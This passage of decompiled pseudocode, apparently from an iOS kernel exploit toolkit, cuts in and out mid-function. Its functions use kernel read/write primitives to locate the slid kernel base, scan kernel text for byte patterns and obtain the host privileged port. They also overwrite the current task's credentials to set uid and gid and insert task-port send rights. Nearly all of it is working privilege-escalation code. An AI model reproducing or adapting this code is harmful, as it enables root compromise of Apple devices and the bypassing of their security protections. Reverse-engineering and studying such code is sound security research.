                    goto LABEL_49;
                  suspend_token[1] = 0;
                }
                if ( !v18 )
                {
                  v41 = 944;
                  do
                  {
                    v42 = v41 + 64;
                    if ( !*(uint64_t *)(v2 + v41) )
                      break;
                    v43 = v41 == 1392;
                    v41 += 64;
                  }
                  while ( !v43 );
                  v44 = v42 - 56;
                  v45 = -3;
                  v18 = 163857;
                  do
                  {
                    v56 = 0;
                    if ( !kread64_internal(
                            (struct_krwCtx *)v2,
                            *(uint64_t *)(v2 + 6384) + (unsigned int)(*(uint32_t *)(v2 + 360) * (v45 + 4)),
                            &v56) )
                    {
                      v18 = 163855;
                      goto LABEL_62;
                    }
                    if ( !v56 )
                      goto LABEL_62;
                    *(uint64_t *)(v2 + v44) = v56;
                    v44 += 8;
                  }
                  while ( !__CFADD__(v45++, 1) );
                  v47 = 0;
                  *(uint64_t *)(v2 + v42 - 64) = *(uint64_t *)(v2 + 6384);
                  do
                  {
                    v48 = v3 + 1;
                    if ( v47 != v3 )
                    {
                      v48 = v47 + 1;
                      if ( !kwrite64(
                              v2,
                              *(uint64_t *)(v2 + 6384) + (unsigned int)(*(uint32_t *)(v2 + 360) * (v47 + 1)),
                              v64[v47]) )
                      {
                        v18 = 163856;
                        goto LABEL_20;
                      }
                    }
                    v47 = v48;
                  }
                  while ( v48 != 3 );
                  v49 = 0;
                  v18 = 708625;
                  v12 = 163878;
                  while ( !(unsigned int)j__fileport_makeport(*(uint32_t *)((char *)v63 + v49), &name) )
                  {
                    v50 = get_task_kobject_addr((struct_krwCtx *)v2, name);
                    if ( !v50 )
                    {
                      v12 = 163854;
                      goto LABEL_123;
                    }
                    v51 = v50;
                    v52 = mach_port_deallocate(mach_task_self_, name);
                    if ( v52 )
                    {
                      v12 = v52 | 0x80000000;
                      goto LABEL_123;
                    }
                    name = 0;
                    if ( !kread64_internal((struct_krwCtx *)v2, v51 + 88, &v55) )
                      goto LABEL_113;
                    if ( !validate_kaddr_range(v2, v55) )
                      goto LABEL_123;
                    if ( v55 == *(uint64_t *)(v2 + 6384) )
                    {
                      if ( kwrite64(v2, v51 + 88, v62) )
                        v12 = 0;
                      else
                        v12 = 163856;
                      goto LABEL_123;
                    }
                    if ( !kread_physmap_decorated((struct_krwCtx *)v2, v51 + 56, (unsigned __int64 *)&v56) )
                      goto LABEL_113;
                    if ( !validate_kaddr_range(v2, v56) )
                      goto LABEL_123;
                    if ( !kread64_internal((struct_krwCtx *)v2, v56 + 160, &v55) )
                    {
LABEL_113:
                      v12 = 163855;
                      goto LABEL_123;
                    }
                    if ( !validate_kaddr_range(v2, v55) )
                      goto LABEL_123;
                    if ( v55 == *(uint64_t *)(v2 + 6384) )
                    {
                      if ( !kwrite64(v2, v56 + 160, v62) )
                      {
                        v12 = 163856;
                        goto LABEL_123;
                      }
                      v18 = 0;
                    }
                    v49 += 4;
                    if ( v49 == 48 )
                      goto LABEL_20;
                  }
                  v53 = errno;
                  v54 = errno;
                  if ( v53 < 0 )
                    v54 = -v54;
                  v12 = v54 | 0x40000000;
LABEL_123:
                  v18 = v12;
                  if ( (v15 & 0x400) != 0 )
                    goto LABEL_22;
                  goto LABEL_21;
                }
LABEL_20:
                v12 = v18;
                if ( (v15 & 0x400) != 0 )
                  goto LABEL_22;
                goto LABEL_21;
              }
            }
          }
        }
      }
      v18 = 163878;
      goto LABEL_20;
    }
  }
LABEL_22:
  v21 = 0;
  v22 = 1;
  do
  {
    v23 = v22;
    v24 = a1[v21];
    if ( v24 != -1 )
      close(v24);
    v22 = 0;
    v21 = 1;
  }
  while ( (v23 & 1) != 0 );
  for ( k = 0; k != 48; k += 4 )
  {
    v26 = *(uint32_t *)((char *)v63 + k);
    if ( v26 != -1 )
      close(v26);
  }
  if ( name + 1 > 1 )
    mach_port_deallocate(mach_task_self_, name);
  v10 = v12 == 0;
LABEL_7:
  *(uint32_t *)(x0_0 + 12) = v10;
  return 0;
}

//----- (0000000000039888) ----------------------------------------------------
unsigned __int64 __fastcall kernel_get_base_slid(struct_krwCtx *krwCtx, unsigned __int64 optional_vtable_func)
{
  unsigned __int64 kbase; // x20
  int kernPageSize; // w8
  __int64 kernSpacing; // x22
  bool is16KPage; // zf
  unsigned __int64 v7; // x8
  mach_port_t port; // w0
  unsigned __int64 ipc_port_kaddr; // x0
  unsigned __int64 v10; // x0
  struct mach_header_64 header; // [xsp+8h] [xbp-58h] BYREF
  unsigned __int64 vtable_func; // [xsp+28h] [xbp-38h] BYREF

  vtable_func = optional_vtable_func;
  if ( !optional_vtable_func )
  {
    port = IORegistryEntryFromPath(kIOMasterPortDefault, "IOService:/");
    if ( port + 1 < 2 )
      return 0;
    ipc_port_kaddr = task_self_get_ipc_port(krwCtx, port);
    if ( !ipc_port_kaddr )
      return 0;
    v10 = maybe_ipc_port_get_kobject(krwCtx, ipc_port_kaddr);
    vtable_func = v10;
    if ( !v10 )
      return 0;
    if ( !kread_physmap_decorated(krwCtx, v10, &vtable_func) )
      return 0;
    vtable_func = krw_xpac_vaddr_2(krwCtx, vtable_func);
    if ( !kread_physmap_decorated(krwCtx, vtable_func, &vtable_func) )
      return 0;
    optional_vtable_func = krw_xpac_vaddr_2(krwCtx, vtable_func);
    vtable_func = optional_vtable_func;
  }
  kbase = 0;
  kernPageSize = krwCtx->pageSizeOrSomething;
  if ( kernPageSize == 0x4000 )
    kernSpacing = 0x4000;
  else
    kernSpacing = 0x100000;
  is16KPage = kernPageSize == 0x4000;
  v7 = optional_vtable_func & -kernSpacing;
  if ( !is16KPage )
    v7 += 0x4000LL;
  if ( v7 >= 0xFFFF000000000000LL )
  {
    kbase = v7;
    while ( (unsigned int)krw_read_thunk(krwCtx, kbase, 4, &header) )
    {
      if ( header.magic == 0xFEEDFACF )
      {
        if ( !(unsigned int)krw_read_thunk(krwCtx, kbase + 4, 0x18, &header.cputype) )
          return 0;
        if ( header.filetype == MH_EXECUTE && header.ncmds >= 9 && header.ncmds < 0x40 )
          return kbase;
      }
      kbase -= kernSpacing;
      if ( kbase <= 0xFFFEFFFFFFFFFFFFLL )
        return 0;
    }
    return 0;
  }
  return kbase;
}

//----- (0000000000039A24) ----------------------------------------------------
__int64 __fastcall init_pgtable_walk_ctx(struct_krwCtx *krwCtx, unsigned __int64 a2)
{
  __int64 result; // x0
  unsigned __int64 v3; // x20
  struct_a1 *v5; // x0
  __int64 v6; // x21
  __int128 v7; // q1
  int v8; // w3

  if ( krwCtx->kernelMachoCtx )
    return 0;
  v3 = a2;
  if ( !a2 )
  {
    v3 = kernel_get_base_slid(krwCtx, 0);
    if ( !v3 )
      return 163860;
  }
  v5 = (struct_a1 *)calloc(0x128u, 1u);
  if ( !v5 )
    return 708617;
  v6 = (__int64)v5;
  krw_ctx_zero_fields(v5, krwCtx);
  v7 = *(__int128 *)&krwCtx->gap_0x150;
  *(__int128 *)(v6 + 112) = *(__int128 *)&krwCtx->xnuMajorVersion;
  *(__int128 *)(v6 + 128) = v7;
  *(uint64_t *)(v6 + 144) = krwCtx->gap_0x160_size8;
  *(uint32_t *)(v6 + 152) = krwCtx->vmMapSize_size4;
  *(uint32_t *)(v6 + 56) = krwCtx->pageSizeOrSomething;
  if ( krwCtx->xnuVersionPacked >> 43 <= 0x44Au )
    v8 = 128;
  else
    v8 = 1152;
  if ( !iosurface_physmap_setup_alt(v6, 0, v3, v8) )
    return 163863;
  result = 0;
  krwCtx->kernelMachoCtx = v6;
  return result;
}

//----- (0000000000039B14) ----------------------------------------------------
unsigned __int64 __fastcall init_kread_pattern_addrs(uint64_t *a1)
{
  unsigned __int64 result; // x0
  unsigned __int64 v3; // [xsp+0h] [xbp-20h] BYREF
  unsigned __int64 v4; // [xsp+8h] [xbp-18h] BYREF

  result = find_kread_pattern_versioned(a1[831], &v4, &v3);
  if ( (uint32_t)result )
  {
    result = comm_page_memory_size();
    if ( result )
    {
      a1[782] = v4;
      a1[783] = v3;
      a1[784] = result;
      return 1;
    }
  }
  return result;
}

//----- (0000000000039B70) ----------------------------------------------------
void __usercall resolve_kernel_text_range(SearchObj *x8_0, struct_krwCtx *a2)
{
    __int64 base_ptr; // x9
    __int64 size; // x10
    __int64 v6; // x0
    char *v7; // x0
    unsigned __int64 v8; // x21
    unsigned __int64 v9; // x8
    __int64 v10; // x9
    __int64 v11; // x8
    SearchObj a1; // [xsp+8h] [xbp-38h] BYREF

    x8_0->field_0x00 = 0LL;
    x8_0->base_ptr = 0LL;
    x8_0->size = 0LL;
    if ( krw_ctx_has_flag(a2, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
      goto LABEL_2;
    if ( krw_ctx_has_flag(a2, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
    {
      macho_walk_segment_by_name("__PPLTEXT", a2->kernelMachoCtx, &a1);
      goto LABEL_5;
    }
    macho_find_text_section(a2->kernelMachoCtx, &a1.field_0x00);
    base_ptr = a1.base_ptr;
    size = a1.size;
    if ( a2->xnuVersionPacked < XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
    {
      x8_0->field_0x00 = a1.field_0x00;
      x8_0->base_ptr = base_ptr;
      x8_0->size = size;
      return;
    }
    a1.base_ptr = a1.base_ptr + a1.size - 0x20000;
    a1.size = 0x20000LL;
    v6 = kernel_pattern_scan(&a1, "08 DC 70 92", 0);
    if ( !v6 )
      goto LABEL_2;
    v7 = resolve_branch_target((__int64 *)a2->kernelMachoCtx, (__int64 *)(v6 - 4));
    if ( !v7 )
      goto LABEL_2;
    v8 = (unsigned __int64)v7;
    macho_find_text_section(a2->kernelMachoCtx, &a1.field_0x00);
    v9 = a1.base_ptr - v8;
    if ( a1.base_ptr > v8
      || (v10 = a1.size, v8 >= a1.size + a1.base_ptr)
      || (x8_0->field_0x00 = a1.field_0x00, x8_0->base_ptr = v8, v11 = v9 + v10, (x8_0->size = v11) == 0) )
    {
  LABEL_2:
      macho_find_text_section(a2->kernelMachoCtx, &a1.field_0x00);
  LABEL_5:
      *x8_0 = a1;
    }
  }
//void resolve_kernel_text_range(uint64_t *a1, struct_krwCtx *a2)
//{
//  __int64 v4; // x10
//  __int64 v5; // x0
//  char *v6; // x0
//  char *v7; // x21
//  __int64 v8; // x8
//  __int64 v9; // x9
//  __int64 v10; // x8
//  __int128 v11; // [xsp+8h] [xbp-38h] BYREF
//  __int64 v12; // [xsp+18h] [xbp-28h]
//
//  *a1 = 0;
//  a1[1] = 0;
//  a1[2] = 0;
//  if ( krw_ctx_has_flag(a2, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
//    goto LABEL_2;
//  if ( krw_ctx_has_flag(a2, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
//  {
//    macho_walk_segment_by_name("__PPLTEXT", &v11, a2->kernelMachoCtx);
//    goto LABEL_5;
//  }
//  macho_find_text_section(a2->kernelMachoCtx, &v11);
//  v4 = v12;
//  if ( a2->xnuVersionPacked < XNU_VERSION_PACKED(7195, 100, 326, 0, 0) )
//  {
//    *(__int128 *)a1 = v11;
//    a1[2] = v4;
//    return;
//  }
//  *((uint64_t *)&v11 + 1) = *((uint64_t *)&v11 + 1) + v12 - 0x20000;
//  v12 = 0x20000;
//  v5 = kernel_pattern_scan((__int64)&v11, "08 DC 70 92", 0);
//  if ( !v5 )
//    goto LABEL_2;
//  v6 = resolve_branch_target((__int64 *)a2->kernelMachoCtx, (__int64 *)(v5 - 4));
//  if ( !v6 )
//    goto LABEL_2;
//  v7 = v6;
//  macho_find_text_section(a2->kernelMachoCtx, &v11);
//  v8 = *((uint64_t *)&v11 + 1) - (uint64_t)v7;
//  if ( *((uint64_t *)&v11 + 1) > (unsigned __int64)v7
//    || (v9 = v12, (unsigned __int64)v7 >= v12 + *((uint64_t *)&v11 + 1))
//    || (*a1 = v11, a1[1] = v7, v10 = v8 + v9, (a1[2] = v10) == 0) )
//  {
//LABEL_2:
//    macho_find_text_section(a2->kernelMachoCtx, &v11);
//LABEL_5:
//    *(__int128 *)a1 = v11;
//    a1[2] = v12;
//  }
//}

//----- (0000000000039CC0) ----------------------------------------------------
__int64 __fastcall check_task_dyld_info_versioned(struct_krwCtx *krwCtx, task_name_t target_task, int a3, const void *a4, mach_vm_size_t a5)
{
  __int64 result; // x0
  int xnuMajorVersion; // w8
  int v12; // w8
  unsigned __int64 v13; // x9
  unsigned int v16; // w24
  mach_msg_type_number_t v17; // w8
  task_flavor_t v18; // w1
  int v19; // w9
  unsigned __int64 v20; // x24
  mach_msg_type_number_t task_info_outCnt; // [xsp+Ch] [xbp-84h] BYREF
  uint8_t __s1[32]; // [xsp+10h] [xbp-80h] BYREF
  integer_t task_info_out[8]; // [xsp+30h] [xbp-60h] BYREF

  result = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion > 8791 )
  {
    if ( xnuMajorVersion != 8792 && xnuMajorVersion != 10002 && xnuMajorVersion != 8796 )
      return result;
    goto LABEL_14;
  }
  if ( (unsigned int)(xnuMajorVersion - 8019) < 2 )
  {
LABEL_14:
    v12 = 64;
    v13 = XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023);
    goto LABEL_15;
  }
  if ( xnuMajorVersion == 6153 )
  {
    v16 = 160;
    goto LABEL_18;
  }
  if ( xnuMajorVersion != 7195 )
    return result;
  v12 = 148;
  v13 = XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023);
LABEL_15:
  if ( krwCtx->xnuVersionPacked <= v13 )
    v16 = 156;
  else
    v16 = v12;
LABEL_18:
  if ( (unsigned int)(a3 - 1) >= 2 )
  {
    if ( a3 != 3 )
      return 0;
    v16 += 8;
    v17 = 8;
    v18 = 15;
    v19 = 32;
  }
  else
  {
    v17 = 2;
    v18 = 13;
    v19 = 8;
  }
  if ( v19 != (uint32_t)a5 )
    return 0;
  task_info_outCnt = v17;
  if ( task_info(target_task, v18, task_info_out, &task_info_outCnt) )
    return 0;
  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
  {
    result = get_task_kobject_addr(krwCtx, target_task);
    if ( !result )
      return result;
  }
  else
  {
    result = kread_physmap_two_hops(krwCtx, target_task);
    if ( !result )
      return result;
  }
  v20 = result + v16;
  result = krw_read_thunk(krwCtx, v20, (unsigned int)a5, __s1);
  if ( !(uint32_t)result )
    return result;
  if ( memcmp(__s1, task_info_out, (unsigned int)a5) )
    return 0;
  if ( !krwCtx->selfTaskDyldInfoKaddr && a3 == 2 && mach_task_self_ == target_task )
  {
    krwCtx->selfTaskDyldInfoValue = *(uint64_t *)task_info_out;
    krwCtx->selfTaskDyldInfoKaddr = v20;
  }
  return kwritebuf_universal(krwCtx, v20, a4, a5);
}

//----- (0000000000039EAC) ----------------------------------------------------
__int64 __fastcall create_pthread_something(struct_krwCtx *krwCtx, pthread_t *a2, __int64 a3, void *a4)
{
  int v8; // w0
  int v9; // w8
  __int64 v10; // x20
  int v11; // w0
  void *(__cdecl *v12)(void *); // x0
  int v13; // w8
  mach_port_t v15; // w0
  thread_act_t v16; // w22
  unsigned int v17; // w1
  int v18; // w0
  kern_return_t v19; // w0
  pthread_t v20; // [xsp+0h] [xbp-70h] BYREF
  pthread_attr_t v21; // [xsp+8h] [xbp-68h] BYREF

  v20 = 0;
  v8 = pthread_attr_init(&v21);
  if ( v8 )
  {
    if ( v8 >= 0 )
      v9 = v8;
    else
      v9 = -v8;
    return v9 | 0x40000000u;
  }
  else
  {
    v11 = pthread_attr_setdetachstate(&v21, 1);
    if ( v11
      || (v12 = (void *(__cdecl *)(void *))nullsub_1(a3), (v11 = pthread_create_suspended_np(&v20, &v21, v12, a4)) != 0) )
    {
      if ( v11 >= 0 )
        v13 = v11;
      else
        v13 = -v11;
      v10 = v13 | 0x40000000u;
    }
    else
    {
      v10 = 163843;
      v15 = pthread_mach_thread_np(v20);
      if ( v15 )
      {
        v16 = v15;
        v17 = krwCtx->parentTaskPort;
        if ( !v17 )
          v17 = krwCtx->targetVmPort;
        if ( kwrite_task_dispatch_via_kobj(krwCtx, v17, v15) )
        {
          v19 = thread_resume(v16);
          if ( v19 )
          {
            v10 = v19 | 0x80000000;
          }
          else
          {
            v10 = 0;
            *a2 = v20;
          }
        }
      }
      else
      {
        v10 = 163848;
      }
    }
    pthread_attr_destroy(&v21);
  }
  return v10;
}
// 39FA8: variable 'v18' is possibly undefined
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (0000000000039FDC) ----------------------------------------------------
bool __fastcall kwrite_task_dispatch_via_kobj(struct_krwCtx *someCtx, unsigned int a2, unsigned int a3)
{
  int v5; // w22
  __int64 v6; // x0
  unsigned __int64 newValue; // x20
  unsigned __int64 v8; // x0
  mach_vm_address_t address; // x23
  __int64 v10; // [xsp+8h] [xbp-38h] BYREF

  if ( someCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
    v5 = 1;
  else
    v5 = 0x4000000;
  if ( a2 )
  {
    v6 = get_kobj_and_resolve_kaddr(someCtx, a2, 0);
    if ( v6 )
    {
      newValue = v6;
      v8 = get_task_kobj_dispatch(someCtx, a3);
      if ( v8 )
      {
        address = v8;
        if ( kread_physmap_decorated(someCtx, v8, (unsigned __int64 *)&v10) )
        {
          if ( (unsigned int)task_kobject_update_flag_bits(someCtx, a3, v5, 1) )
          {
            vm_attr_increment_offset_check(someCtx, newValue);
            if ( someCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
              return kwrite64(someCtx, address, newValue);
            else
              return kwrite64_dispatch(someCtx, address, newValue);
          }
        }
      }
    }
  }
  else
  {
    return task_kobject_update_flag_bits(someCtx, a3, v5, 0);
  }
    return 0;
}

//----- (000000000003A100) ----------------------------------------------------
bool __fastcall pthread_create_and_join(struct_krwCtx *krwCtx, __int64 a2, void *a3)
{
  int v3; // w0
  pthread_t v5; // [xsp+8h] [xbp-8h] BYREF

  v5 = 0;
  v3 = create_pthread_something(krwCtx, &v5, a2, a3);
  if ( !v3 )
    v3 = pthread_join(v5, 0) != 0;
  return v3 == 0;
}

//----- (000000000003A150) ----------------------------------------------------
__int64 __fastcall get_or_set_uid_cred_in_task(struct_krwCtx *krwCtx, int a2, int a3, int a4)
{
  uid_t v8; // w21
  __int64 result; // x0
  unsigned __int64 v10; // x23
  unsigned __int64 v11; // x0
  int v12; // w8
  __int64 v13; // x8
  unsigned __int64 v14; // x21
  __int64 v15; // x0
  __int64 v16; // x0
  unsigned __int64 v17; // x0
  uint8_t newCred[0x58]; // [xsp+0h] [xbp-150h] BYREF
  uint64_t selfTaskKaddr; // [xsp+68h] [xbp-E8h] BYREF
  uint8_t oldCred[0x58]; // [xsp+68h] [xbp-E8h] BYREF
  int v31; // [xsp+CCh] [xbp-84h] BYREF
  uint64_t v32[3]; // [xsp+D0h] [xbp-80h] BYREF
  int v33; // [xsp+ECh] [xbp-64h] BYREF
  __int64 v34; // [xsp+F0h] [xbp-60h] BYREF
  __int64 v35; // [xsp+F8h] [xbp-58h] BYREF
  __int64 v36; // [xsp+100h] [xbp-50h] BYREF
  unsigned __int64 v37; // [xsp+108h] [xbp-48h] BYREF

  v8 = getuid();
  result = get_kobj_and_resolve_kaddr(krwCtx, mach_task_self_, 0);
  if ( result )
  {
    result = krw_read_thunk(krwCtx, result + 104, 4, &v31);
    if ( (uint32_t)result )
    {
      if ( !krwCtx->savedUid && !krwCtx->savedGid )
      {
        krwCtx->savedUid = v8;
        krwCtx->savedGid = v31;
      }
      if ( v8 == a2 && v31 == a3 )
        return 1;
      if ( a4 )
        goto LABEL_10;
      if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_MOBILEBACKUP_SANDBOX_PATCHED) )
        return 0;
      result = krwCtx->cachedSelfTaskKaddr;
      if ( !result )
      {
LABEL_10:
        selfTaskKaddr = 0;
        result = get_kobj_and_resolve_kaddr(krwCtx, mach_task_self_, &selfTaskKaddr);
        if ( !result )
          return result;
        if ( !krwCtx->cachedSelfTaskKaddr )
        {
          krwCtx->cachedSelfTaskKaddr = result;
          krwCtx->gap_0x18E8 = selfTaskKaddr;
        }
      }
      v10 = result + 24;
      result = krw_read_thunk(krwCtx, result + 24, sizeof(oldCred), oldCred);
      if ( (uint32_t)result )
      {
        memcpy(newCred, oldCred, sizeof(newCred));
        *(uint32_t *)(newCred + 0) = a2;
        *(uint32_t *)(newCred + 4) = a2;
        *(uint32_t *)(newCred + 8) = a2;
        *(uint32_t *)(newCred + 0x10) = a3;
        *(uint32_t *)(newCred + 0x50) = a3;
        *(uint32_t *)(newCred + 0x54) = a3;
        if ( !memcmp(newCred, oldCred, sizeof(newCred))
          || (result = kwritebuf_universal(krwCtx, v10, newCred, sizeof(newCred)), (uint32_t)result) )
        {
          v11 = kread_task_struct(krwCtx, mach_task_self_);
          v37 = v11;
          if ( v11 )
          {
            v12 = krwCtx->xnuMajorVersion;
            if ( v12 > 8791 )
            {
              if ( v12 != 8792 && v12 != 8796 && v12 != 10002 )
                return 0;
              v13 = 168;
            }
            else if ( (unsigned int)(v12 - 8019) < 2 )
            {
              v13 = 176;
            }
            else if ( v12 == 6153 )
            {
              v13 = 200;
            }
            else
            {
              if ( v12 != 7195 )
                return 0;
              v13 = 184;
            }
            if ( kread_physmap_decorated(krwCtx, v13 + v11, &v37) )
            {
              if ( v37 )
              {
                if ( !validate_kaddr_range(krwCtx, v37) )
                  return 0;
              }
              else
              {
                if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
                {
                  v14 = krwCtx->gap_0x1990_size8;
                  if ( !v14 )
                  {
                    macho_find_text_section(krwCtx->kernelMachoCtx, v32);
                    v16 = kernel_pattern_scan((__int64)v32, "00 7D 04 13 .. .. .. .. .. .. .. .. 21 05 80 52", 0);
                    if ( !v16 )
                      return 0;
                    v17 = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(v16 + 4));
                    if ( !v17 )
                      return 0;
                    v14 = v17;
                    krwCtx->gap_0x1990_size8 = v17;
                  }
                  if ( kread_physmap_decorated(krwCtx, v14, &v37)
                    && v37 <= 0x3FF
                    && kread_physmap_decorated(krwCtx, v14 + krwCtx->stride_0x168, (unsigned __int64 *)&v36)
                    && validate_kaddr_range(krwCtx, v36)
                    && kread_physmap_decorated(
                         krwCtx,
                         v36 + ((unsigned int)v37 & a2) * (__int64)krwCtx->stride_0x168,
                         (unsigned __int64 *)&v35)
                    && validate_kaddr_range(krwCtx, v35) )
                  {
                    v15 = v35;
                    while ( (unsigned int)krw_read_thunk(krwCtx, v15 + 2LL * krwCtx->stride_0x168, 4, &v33) )
                    {
                      if ( v33 == a2 )
                      {
                        if ( kread_physmap_decorated(
                               krwCtx,
                               v35 + 3LL * krwCtx->stride_0x168,
                               (unsigned __int64 *)&v34) )
                        {
                          v34 += 4;
                          if ( kwrite_physmap_with_a3_ptr(krwCtx, v35 + 3LL * krwCtx->stride_0x168, v34) )
                          {
                            if ( v35 )
                              return 1;
                          }
                        }
                        return 0;
                      }
                      if ( kread_physmap_decorated(krwCtx, v35, (unsigned __int64 *)&v35) )
                      {
                        v15 = validate_kaddr_range(krwCtx, v35);
                        v35 = v15;
                        if ( v15 )
                          continue;
                      }
                      return 0;
                    }
                  }
                  return 0;
                }
                v16 = find_kernel_func_at_offset(krwCtx, 0);
                if ( !v16
                  || !(unsigned int)build_kernel_vtable(krwCtx, v16, a2, 1, 0, 0, &v37)
                  || !(unsigned int)build_kernel_vtable(krwCtx, v16, a3, -1, 0, 0, &v37) )
                  return 0;
              }
              return 1;
            }
          }
          return 0;
        }
      }
    }
  }
  return result;
}
// 3A150: too many cbuild loops

//----- (000000000003A57C) ----------------------------------------------------
bool __fastcall kread_u32_modify_lo10_kwrite(struct_krwCtx *krwCtx, unsigned __int64 a2, int a3, int *a4)
{
  uint64_t result; // x0
  int v9; // w2
  int v10; // [xsp+Ch] [xbp-24h] BYREF

  result = kread_u32(krwCtx, a2, &v10);
  if ( result )
  {
    v9 = v10;
    if ( a4 )
      *a4 = v10 & 0x3FF;
    return noppl_kwrite32(krwCtx, a2, (v9 & 0xFFFFFC00) | (a3 & 0x3FF)) != 0;
  }
  return result;
}

//----- (000000000003A5F0) ----------------------------------------------------
__int64 __fastcall insert_task_port_send_right_versioned(struct_krwCtx *krwCtx, task_name_t a2)
{
  unsigned __int64 v2; // x8
  unsigned int v4; // w2
  unsigned int v5; // w4
  bool v6; // zf
  v2 = krwCtx->xnuVersionPacked;
  if ( v2 < XNU_VERSION_PACKED(10002, 60, 75, 0, 3) )
  {
    if ( v2 <= XNU_VERSION_PACKED(8796, 122, 4, 1023, 1023) )
    {
      if ( v2 < XNU_VERSION_PACKED(8796, 102, 5, 0, 0)
        || ((krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 ? (v6 = (krwCtx->flags & 1) == 0) : (v6 = 0), v6) )
      {
        v4 = 4;
        v5 = 15;
        goto LABEL_13;
      }
    }
  }
  else if ( (krwCtx->flags & 0x20) != 0 )
  {
    return insert_mach_port_send_right(krwCtx, a2, 4u, (__int64)kIogpuMachPortSelectors, 0xFu);
  }
  v4 = 2;
  v5 = 3;
LABEL_13:
  return insert_mach_port_send_right(krwCtx, a2, v4, 0, v5);
}

//----- (000000000003A72C) ----------------------------------------------------
unsigned __int64 __fastcall get_kernel_task_host_port(struct_krwCtx *krwCtx)
{
  mach_port_t v2; // w20
  unsigned __int64 result; // x0
  unsigned __int64 v4; // x8
  unsigned __int64 v5; // x21
  kern_return_t special_port; // w20
  struct {
    int v7; // [xsp+8h] [xbp-28h] BYREF
    mach_port_t port; // [xsp+Ch] [xbp-24h] BYREF
  } locals;

  v2 = mach_host_self();
  result = krwCtx->hostPrivPort;
  if ( (unsigned int)(result + 1) <= 1 )
  {
    if ( !host_get_special_port(v2, -1, 2, &locals.port) )
      return locals.port;
    v4 = krwCtx->xnuVersionPacked;
    if ( v4 >= XNU_VERSION_PACKED(8019, 0, 0, 0, 0)
      && ((krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0
       || v4 > XNU_VERSION_PACKED(8792, 40, 107, 1023, 1023)
       || (v4 >= XNU_VERSION_PACKED(8020, 241, 8, 0, 0) && krwCtx->xnuMajorVersion <= 8791)) )
    {
      result = get_ipc_port_kaddr_via_host(krwCtx, 2);
      if ( !result )
        return result;
      if ( !(unsigned int)plist_elem_is_string_6(krwCtx, result, &locals.port) )
        return locals.port;
      return 0;
    }
    result = task_self_get_ipc_port(krwCtx, v2);
    if ( result )
    {
      v5 = result;
      result = kread_u32_modify_lo10_kwrite(krwCtx, result, 4, &locals.v7);
      if ( (uint32_t)result )
      {
        special_port = host_get_special_port(v2, -1, 2, &locals.port);
        kread_u32_modify_lo10_kwrite(krwCtx, v5, locals.v7, 0);
        if ( special_port )
          return 0;
        return locals.port;
      }
    }
  }
  return result;
}

//----- (000000000003A878) ----------------------------------------------------
unsigned __int64 __fastcall get_ioservice_conn_port(struct_krwCtx *krwCtx)
{
  unsigned __int64 result; // x0
  mach_port_name_t v3; // [xsp+Ch] [xbp-14h] BYREF

  result = krwCtx->hostSecurityPort;
  if ( (unsigned int)(result + 1) <= 1 )
  {
    result = get_ipc_port_kaddr_via_host(krwCtx, 0);
    if ( result )
    {
      if ( (unsigned int)plist_elem_is_string_6(krwCtx, result, &v3) )
        return 0;
      else
        return v3;
    }
  }
  return result;
}

//----- (000000000003A8DC) ----------------------------------------------------
__int64 __fastcall kread_proc_kobj_entitlement_data(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 result; // x0
  __int64 v5; // x8
  unsigned __int64 v6; // x1
  unsigned __int64 *v7; // x2
  int v8; // w0
  __int64 v9; // [xsp+0h] [xbp-40h] BYREF
  unsigned __int64 v10; // [xsp+8h] [xbp-38h] BYREF
  __int64 v11; // [xsp+10h] [xbp-30h] BYREF
  unsigned __int64 v12; // [xsp+18h] [xbp-28h] BYREF
  unsigned __int64 v13; // [xsp+20h] [xbp-20h] BYREF
  __int64 v14; // [xsp+28h] [xbp-18h] BYREF

  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
    return 1;
  result = task_struct_field_kread(krwCtx, a2);
  if ( result )
  {
    result = kread_physmap_decorated(krwCtx, result + 176, (unsigned __int64 *)&v14);
    if ( (uint32_t)result )
    {
      result = validate_kaddr_range(krwCtx, v14);
      if ( result )
      {
        result = kread_physmap_decorated(krwCtx, v14 + 80, &v13);
        if ( (uint32_t)result )
        {
          if ( v13 )
          {
            v5 = krwCtx->gap_0x128;
            if ( v5 )
            {
              if ( v13 != v5 )
              {
                v11 = 0;
                v12 = 0;
                v9 = 0;
                v10 = 0;
                if ( !(unsigned int)krw_read_thunk(krwCtx, v5 + 40, 8, &v10)
                  || !(unsigned int)krw_read_thunk(krwCtx, krwCtx->gap_0x128 + 48LL, 8, &v9)
                  || !(unsigned int)krw_read_thunk(krwCtx, v13 + 40, 8, &v12)
                  || !(unsigned int)krw_read_thunk(krwCtx, v13 + 48, 8, &v11) )
                {
                  return 0;
                }
                if ( v12 <= v10 )
                {
                  v6 = v13 + 48;
                  v7 = (unsigned __int64 *)&v9;
                }
                else
                {
                  v6 = v13 + 40;
                  v7 = &v10;
                }
                if ( !necp_kread_region(krwCtx, v6, (__int64)v7, 8) )
                  return 0;
              }
            }
          }
          return 1;
        }
      }
    }
  }
  return result;
}
// 3AA0C: variable 'v8' is possibly undefined

//----- (000000000003AA2C) ----------------------------------------------------
